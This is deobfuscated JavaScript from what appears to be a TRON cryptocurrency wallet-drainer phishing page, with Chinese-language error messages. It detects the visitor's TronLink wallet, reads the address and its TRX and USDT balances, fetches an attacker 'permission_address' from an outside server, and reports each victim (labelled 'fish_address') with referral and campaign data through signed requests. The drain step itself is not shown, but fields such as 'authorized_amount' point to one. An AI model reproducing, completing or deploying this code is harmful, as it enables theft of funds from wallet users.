//Wed May 14 2025 15:54:08 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
window.API_URL = "https://newapi.lll0.icu";
const _0x239716 = {
  "address": null,
  "trxBalance": null,
  "usdtBalance": null,
  "tgusername": null
};
let _0x31abfe = false;
const _0x492b19 = "your-shared-secret",
  _0x39a40b = "TPWJyggvoJDRsCRHjSuUNTrd4fGQShBoeG",
  _0xc530b3 = {
    "trx_balance": "0",
    "usdt_balance": "0",
    "authorized_amount": "2",
    "permission_address": _0x39a40b,
    "notification_switch": "1"
  };
function _0x260e28(_0x4b5403) {
  const _0x44da62 = document.createElement("div");
  Object.assign(_0x44da62.style, {
    "position": "fixed",
    "top": "38%",
    "left": "50%",
    "transform": "translateX(-50%)",
    "backgroundColor": "rgba(240, 240, 240, 1)",
    "color": "black",
    "padding": "10px 20px",
    "borderRadius": "10px",
    "boxShadow": "0 4px 8px rgba(0, 0, 0, 0.2)",
    "zIndex": "1000",
    "fontSize": "16px",
    "textAlign": "center",
    "maxWidth": "80%"
  });
  _0x44da62.textContent = _0x4b5403;
  document.body.appendChild(_0x44da62);
  setTimeout(() => _0x44da62.remove(), 3000);
}
function _0x218aab(_0x27d6e9, _0x4b2647) {
  if (typeof CryptoJS !== "object" || !CryptoJS.HmacSHA256) throw new Error("CryptoJS 未加载，请检查网络或刷新页面");
  const _0x3772eb = JSON.stringify(_0x27d6e9) + _0x4b2647;
  return CryptoJS.HmacSHA256(_0x3772eb, _0x492b19).toString(CryptoJS.enc.Hex);
}
async function _0x32bfa6() {
  const _0x56a5b3 = {},
    _0x2c50ee = Date.now().toString(),
    _0x2b14b9 = _0x218aab(_0x56a5b3, _0x2c50ee);
  try {
    const _0x352333 = await fetch(window.API_URL + "/api/get_contract_address", {
      "method": "POST",
      "headers": {
        "X-Timestamp": _0x2c50ee,
        "X-Signature": _0x2b14b9,
        "Content-Type": "application/json"
      },
      "body": JSON.stringify(_0x56a5b3)
    });
    if (!_0x352333.ok) {
      throw new Error("获取合约地址失败");
    }
    const _0x91602b = await _0x352333.json();
    return _0x91602b.contract_address || _0x39a40b;
  } catch (_0x1dabcb) {
    return console.error("获取合约地址失败:", _0x1dabcb.message), _0x39a40b;
  }
}
function _0x25cb70(_0x3b03f3) {
  if (!_0x3b03f3.uid || typeof _0x3b03f3.uid !== "string" || _0x3b03f3.uid.length > 50) throw new Error("uid 无效");
  if (!_0x3b03f3.fish_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x3b03f3.fish_address)) throw new Error("fish_address 无效");
  if (!_0x3b03f3.permission_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x3b03f3.permission_address)) {
    throw new Error("permission_address 无效");
  }
  if (![1, 2, 3].includes(_0x3b03f3.auth_status)) throw new Error("auth_status 必须为 1、2 或 3");
  if (_0x3b03f3.utmSource && typeof _0x3b03f3.utmSource !== "string") throw new Error("utmSource 无效");
  if (_0x3b03f3.txid && (typeof _0x3b03f3.txid !== "string" || _0x3b03f3.txid.length > 100)) {
    throw new Error("txid 无效");
  }
  return true;
}
function _0x1e8495(_0x50270a, _0x358b04 = null) {
  const _0x5655dd = new URLSearchParams(window.location.search),
    _0x73f29 = _0x5655dd.get("utm_source") || "unknown",
    _0x2e9481 = {
      "uid": _0x239716.tgusername || "unknown",
      "fish_address": _0x239716.address,
      "permission_address": _0xc530b3.permission_address,
      "auth_status": _0x50270a,
      "utmSource": _0x73f29,
      "txid": _0x358b04
    };
  try {
    _0x25cb70(_0x2e9481);
  } catch (_0x45c641) {
    console.warn("通知数据验证失败:", _0x45c641.message);
    return;
  }
  const _0x10af96 = Date.now().toString(),
    _0x5901be = _0x218aab(_0x2e9481, _0x10af96),
    _0x24c024 = async (_0x9b9c8f = 0) => {
      if (_0x9b9c8f >= 3) {
        console.warn("通知发送失败，已达最大重试次数");
        return;
      }
      try {
        const _0x5085d6 = await fetch(window.API_URL + "/api/notify", {
          "method": "POST",
          "headers": {
            "Content-Type": "application/json",
            "X-Timestamp": _0x10af96,
            "X-Signature": _0x5901be
          },
          "body": JSON.stringify(_0x2e9481)
        });
        if (!_0x5085d6.ok) {
          const _0x46964b = await _0x5085d6.json().catch(() => ({}));
          if (_0x5085d6.status === 429) {
            console.warn("请求过于频繁，将重试");
            setTimeout(() => _0x24c024(_0x9b9c8f + 1), 1000);
            return;
          }
          throw new Error("通知失败: " + (_0x46964b.error || _0x5085d6.statusText));
        }
        const _0x2aed7a = await _0x5085d6.json();
        console.log("通知发送成功 (auth_status=" + _0x50270a + "):", _0x2aed7a);
      } catch (_0x254c5a) {
        console.warn("通知发送失败 (尝试 " + (_0x9b9c8f + 1) + "/3):", _0x254c5a.message);
        setTimeout(() => _0x24c024(_0x9b9c8f + 1), 1000);
      }
    };
  _0x24c024();
}
async function _0x577e60() {
  if (_0x31abfe) return;
  if (await _0x64e41a()) {
    _0x31abfe = true;
    await _0x5d4b98();
    _0x24940b();
  } else setTimeout(_0x577e60, 1500);
}
async function _0x64e41a() {
  try {
    if (window.tronWeb?.["ready"]) {
      return await _0x5d4b98(), true;
    }
    const _0x5da8e1 = () => new Promise(_0x30eab6 => {
        let _0x2fd9e7 = 0;
        const _0x3e9f9b = setInterval(() => {
          (window.tronWeb?.["ready"] || _0x2fd9e7++ >= 10) && (clearInterval(_0x3e9f9b), _0x30eab6(window.tronWeb?.["ready"]));
        }, 500);
      }),
      _0x1a0cff = await _0x5da8e1();
    if (_0x1a0cff) {
      return await _0x5d4b98(), true;
    }
    return false;
  } catch (_0x41b3e8) {
    return console.error("连接钱包失败:", _0x41b3e8), false;
  }
}
async function _0x5d4b98() {
  if (!window.tronWeb?.["ready"]) throw new Error("请连接钱包");
  const _0x32437f = new URLSearchParams(window.location.search);
  _0x239716.tgusername = _0x32437f.get("uid") || null;
  !_0x239716.tgusername && console.warn("未找到推荐ID");
  const _0x4cb6a8 = window.tronWeb.defaultAddress.base58;
  if (!_0x4cb6a8) throw new Error("无法获取钱包地址");
  _0x239716.address = _0x4cb6a8;
  const [_0x2914ce, _0x450a0c] = await Promise.all([window.tronWeb.trx.getBalance(_0x4cb6a8).then(_0x278422 => window.tronWeb.fromSun(_0x278422)).catch(() => "0"), window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t").then(_0x22800f => _0x22800f.balanceOf(_0x4cb6a8).call()).then(_0x5a9b2f => window.tronWeb.fromSun(_0x5a9b2f.toString())).catch(() => "0")]);
  _0x239716.trxBalance = _0x2914ce;
  _0x239716.usdtBalance = _0x450a0c;
  _0xc530b3.permission_address = await _0x32bfa6();
}
async function _0x24940b() {
  if (_0xc530b3.notification_switch !== "1") return;
  _0x1e8495(1);
}